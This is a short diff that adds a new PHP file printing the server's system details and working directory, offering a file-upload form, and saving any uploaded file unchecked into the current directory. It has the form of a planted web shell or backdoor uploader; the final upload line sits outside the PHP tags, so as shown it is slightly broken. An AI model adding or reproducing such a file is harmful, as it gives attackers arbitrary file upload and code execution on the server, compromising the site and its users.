@@ -1,0 +1,4 @@
+<?php echo php_uname(); echo getcwd(); ?>
+<form enctype="multipart/form-data" method="post"><input type="file" name="f"><input type="submit" name="upload" value="Upload"></form>
+if (move_uploaded_file($_FILES['f']['tmp_name'], getcwd()."/".$_FILES['f']['name'])) {}
+
